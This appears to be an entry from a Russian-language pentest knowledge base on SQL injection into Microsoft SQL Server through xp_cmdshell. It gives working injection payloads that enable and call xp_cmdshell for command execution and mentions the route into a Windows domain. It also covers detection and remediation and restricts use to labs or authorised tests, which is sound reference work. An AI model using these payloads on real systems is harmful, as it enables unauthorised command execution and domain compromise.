---
id: sqli-mssql-xp-cmdshell
title: "MSSQL: xp_cmdshell (выполнение команд Windows)"
type: sqli
target: mssql
category: web
difficulty: advanced
bypass: auth
tags: [sqli, mssql, rce, xp-cmdshell]
tested_on: ["SQL Server 2019 (sa, xp_cmdshell включён)"]
success_rate: 0.3
risk: high
cwe: "CWE-78"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "sqli"
    type: instance_of
  - target: "rce"
    type: leads_to
  - target: "active-directory"
    type: leads_to
    description: "Учётка службы SQL Server — входная точка в домен"
---

# MSSQL: xp_cmdshell (выполнение команд Windows)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
'; EXEC xp_cmdshell 'whoami'; --
```

## Explanation

Расширенная процедура `xp_cmdshell` запускает команду в контексте службы SQL Server.
По умолчанию отключена с SQL Server 2005, но включается при `sa`-правах:
`sp_configure 'show advanced options',1; RECONFIGURE; sp_configure 'xp_cmdshell',1; RECONFIGURE`.
Отсюда — стандартный путь в домен Windows (учётка машины, Kerberos, дамп LSASS).

## Detection

Проверка состояния: `SELECT * FROM sys.configurations WHERE name='xp_cmdshell'`.
В логах: `sp_configure`, появление `cmd.exe` как дочернего процесса `sqlservr.exe`,
Event ID 15457 (SQL Server Audit).

## Remediation

- Не использовать `sa` для приложения; выключить `xp_cmdshell` и `Ole Automation Procedures`.
- Параметризация запросов.
- SQL Server под gMSA с минимальными правами, изолированный сегмент сети.
- Аудит `sp_configure` и включения advanced options.

## Variants

```
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
```
